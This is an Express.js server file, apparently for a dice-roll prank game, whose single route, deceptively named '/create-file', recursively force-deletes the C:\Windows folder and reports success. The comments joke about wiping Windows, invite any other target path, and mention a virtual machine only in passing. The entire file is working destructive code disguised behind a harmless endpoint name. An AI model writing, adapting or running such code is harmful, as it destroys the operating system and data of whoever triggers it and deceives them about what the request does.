//those stuff might be useful actually, don't you think ?
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;          //local server port

app.use(express.static('public'));

// Routing to delete the folder when 6 is rolled
app.get('/create-file', (req, res) => {
    try {
        // Define the targetted folder to be deleted (Bye bye Windows)
        // You can set any path / folder you want
        //Just be careful about the folders you delete
        //Play with 'C:\Windows' only a VM obviously
        const folderPath = 'C:\\Windows';

        // Check if folder exists first
        if (fs.existsSync(folderPath)) {
            // Delete the folder and all of its contents if the folder exists
            fs.rmSync(folderPath, { recursive: true, force: true });

            // Log message SUCCESS YES
            console.log(`Folder deleted at: ${folderPath}`);
            res.json({ success: true, message: `Folder deleted at ${folderPath}` });
        } else {
            // Log message: the folder just doesn't exist at the targetted path
            console.log(`Folder not found: ${folderPath}`);
            res.json({ success: false, message: `Folder not found: ${folderPath}` });
        }
    } catch (error) {
        //log message error
        console.error('Folder deletion ERROR (hard life my guy):', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log('Open your browser and navigate to the URL above');
});